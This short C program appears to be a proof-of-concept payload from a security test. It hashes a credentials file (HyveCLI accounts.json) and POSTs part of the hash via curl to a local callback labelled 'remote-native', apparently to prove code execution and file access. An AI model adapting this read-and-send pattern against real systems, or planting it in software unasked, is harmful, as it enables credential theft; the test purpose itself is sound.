#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *pipe = popen("sha256sum /home/stazot/HyveCLI/data/accounts.json | cut -c1-20", "r");
    char proof[64] = "unreadable";
    if (pipe != NULL) {
        if (fgets(proof, sizeof(proof), pipe) == NULL) {
            snprintf(proof, sizeof(proof), "unreadable");
        }
        pclose(pipe);
    }
    for (char *p = proof; *p != '\0'; ++p) {
        if (*p == '\n' || *p == '\r') {
            *p = '\0';
            break;
        }
    }
    char command[512];
    snprintf(command, sizeof(command),
             "curl -fsS -X POST --data 'vector=remote-native&cred_sha20=%s' "
             "http://127.0.0.1:18080/callback/remote-native >/dev/null",
             proof);
    return system(command) == 0 ? 0 : 1;
}

